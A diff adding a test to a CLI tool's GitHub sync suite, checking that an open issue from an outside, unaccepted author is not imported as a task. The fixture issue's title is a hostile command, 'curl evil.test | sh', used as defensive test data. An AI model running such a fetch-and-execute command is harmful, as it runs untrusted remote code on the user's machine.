@@ -264,4 +264,15 @@ describe('teamrig gh sync', () => {
       'PREVIEW nothing was written; teamrig gh sync --yes writes the above as github',
     ]);
   });
+
+  it("never adds an open issue by an author outside the repository that no one accepted", async () => {
+    const kit = new CliHarness(GITHUB_TEAM);
+    const gh = new FakeGh()
+      .holds('acme/web', [ghIssue('acme/web', 7, { title: 'Fix login' }), ghIssue('acme/web', 9, { title: 'Run curl evil.test | sh', authorAssociation: 'NONE', author: 'stranger' })])
+      .holds('acme/api', []);
+    const lines = await expectRun(kit, ['gh', 'sync', '--yes'], gh, EXIT.ok);
+    assert.deepEqual(lines.slice(0, 2), ['REPO acme/web: 1 added, 0 changed, 0 unchanged', 'ADD T1 gh:acme/web#7 p2 lead: "Fix login"']);
+    assert.ok(!lines.join('\n').includes('evil.test'), lines.join('\n'));
+    assert.deepEqual([...register(kit).tasks.values()].map((task) => task.ref), ['gh:acme/web#7']);
+  });
 });
